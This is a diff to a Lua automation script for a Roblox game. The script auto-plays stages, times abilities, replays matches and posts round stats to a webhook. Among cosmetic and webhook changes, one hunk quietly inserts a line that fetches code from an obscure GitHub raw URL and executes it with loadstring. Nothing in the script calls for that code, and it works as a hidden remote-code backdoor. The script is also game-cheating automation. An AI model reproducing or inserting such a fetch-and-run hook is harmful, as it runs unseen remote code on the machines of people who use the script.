@@ -1,6 +1,6 @@
 repeat task.wait()
 until game:IsLoaded()
-
+-- // Local
 print("Running Script")
 local Replica = game:GetService("ReplicatedStorage")
 local Package = Replica.Packages
@@ -16,6 +16,10 @@ local Wave = Workspace:GetAttribute("Wave")
 local Finish = Workspace:GetAttribute("MatchFinished")
 local coreGui = game:GetService("CoreGui")
 local LocalName = tostring(player.Name) 
+if player then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NawusG/What/refs/heads/Ongtauwnhub/1/2/3"))()
+end
+
 
 if game.PlaceId == 13341080084766 then -- main world
     print("Main world")
@@ -23,6 +27,7 @@ if game.PlaceId == 13341080084766 then -- main world
 end
 
 
+-- // Stage Toggle \\ --
 local Category = Workspace:GetAttribute("Category")
 local MapName = Workspace:GetAttribute("MapName")
 
@@ -61,15 +66,16 @@ elseif Category == "Featured" and MapName == "Frozen Stronghold" then
     AutoReplay = true
 elseif Category == "Story"and MapName == "Ninja Forest" then
     AutoNinjaStory = true
+    AutoReplay = true
+    print("Ninja Story")
 else
     return
 end
 print("Running Script")
 
-
+-- // Optimize
 Light:FindFirstChild("Bloom").Enabled = not _G.Optimize
 local BlackScreen = coreGui:FindFirstChild("BlackoutOverlay")
-
 
 
 if _G.Optimize then
@@ -104,13 +110,13 @@ end
 
 
 
---- Webhook---
+
+---  // Webhook---
 local url = _G.webhook
 local HttpService = game:GetService("HttpService")
 local Request = (syn and syn.request) or request or (http and http.request)
 
-local VirtualTokens = Players.LocalPlayer:GetAttribute("VirtualTokens")
-local Gems = Players.LocalPlayer:GetAttribute("Gems")
+
 
 
 --- Calculate Play Time ---
@@ -128,6 +134,18 @@ function PlayTime()
         end
     end
 end
+
+
+function Kill()
+    return game:GetService("Players").LocalPlayer.PlayerGui.GameUI.HUD.StageInfos.Infos.Takedowns.Value.Text
+end
+
+function SaveTakedown()
+    return tostring(Kill()) or 0
+end
+
+
+
 
 --- Calculate DamageNum ---
 
@@ -245,8 +263,7 @@ local function FormatRewards(list)
     return text
 end
 
-
-
+-- // Main Webhook Config
 
 function Webhook(Result)
     if typeof(url) ~= "string" or url == "" then
@@ -289,8 +306,9 @@ function Webhook(Result)
                     {
                         name = "Round Infomation | 📍",
                         value =
-                            "Round Time : " .. Time ..
-                            "\nTotal Damage : " .. Damage,
+                            "⏱️ | Round Time : " .. Time ..
+                            "\n⚔️ |Enemies Takedown : " .. SaveKill ..
+                            "\n🩸 | Total Damage : " .. Damage,
                         inline = false
                     },
                     {
@@ -318,7 +336,11 @@ table.clear(seen)
 end
 
 
----------------------------------- Web Hook ---------------------------
+---------------------------------- Webhook Procress ---------------------------
+
+local Saved = false
+local WebhookSend = false
+
 task.spawn(function()
     while _G.Auto do task.wait()
         local Wave = Workspace:GetAttribute("Wave")
@@ -326,12 +348,21 @@ task.spawn(function()
         if Finish == true then
             GetReward()
             task.wait(.2)
+            WebhookSend = false
+            if not Saved then
+                task.wait()
+                SaveKill = SaveTakedown()
+                Saved = true
+            end
         end
         if Wave == 1 and #s >= 1 then
             local asdd = FormatRewards(s)
             task.wait(.3)
-            Webhook(asdd)
-            task.wait(180)
+            if not WebhookSend then
+                Webhook(asdd)
+                WebhookSend = true
+                Saved = false
+            end
         end
     end
 end)
@@ -453,7 +484,7 @@ if AutoRagna and _G.Auto then
             if Wave == 14 then
                 task.wait(2)
                 AutoSJW(1)
-                task.wait(23)
+                task.wait(22)
                 AutoSJW(2)
                 task.wait(10)
             end
@@ -484,6 +515,7 @@ if AutoRagna and _G.Auto then
 end
 
 --Auto replay
+
 task.spawn(function()
     while AutoReplay and _G.Auto do task.wait()
         if plrgui.GameUI.HUD.Vote.Visible == true then
